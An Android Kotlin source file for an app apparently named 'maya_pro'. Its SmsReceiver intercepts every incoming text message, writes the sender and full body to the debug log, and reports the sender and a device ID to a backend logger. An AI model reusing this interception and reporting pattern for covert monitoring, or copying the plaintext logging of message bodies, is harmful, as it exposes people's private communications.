package com.example.maya_pro

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.telephony.SmsMessage
import android.util.Log

class SmsReceiver : BroadcastReceiver() {

    companion object {
        const val TAG = "SmsReceiver"
        const val PREFS_NAME = "maya_phone_control"
        const val KEY_DEVICE_ID = "device_id"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        if (action != "android.provider.Telephony.SMS_RECEIVED") return

        val bundle = intent.extras
        if (bundle == null) return

        val pdus = bundle.get("pdus") as Array<Any>?
        val format = bundle.getString("format")

        pdus?.forEach { pdu ->
            val smsMessage = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                SmsMessage.createFromPdu(pdu as ByteArray, format)
            } else {
                SmsMessage.createFromPdu(pdu as ByteArray)
            }

            val number = smsMessage.originatingAddress ?: ""
            val body = smsMessage.messageBody ?: ""
            val timestamp = smsMessage.timestampMillis

            Log.d(TAG, "SMS received from $number: $body")
            logSms(context, number, "incoming", body, "received")
        }
    }

    private fun logSms(context: Context, number: String, direction: String, content: String, status: String) {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val deviceId = prefs.getString(KEY_DEVICE_ID, "") ?: "unknown"
        BackendLogger.logSms(context, number, direction, status, deviceId)
    }
}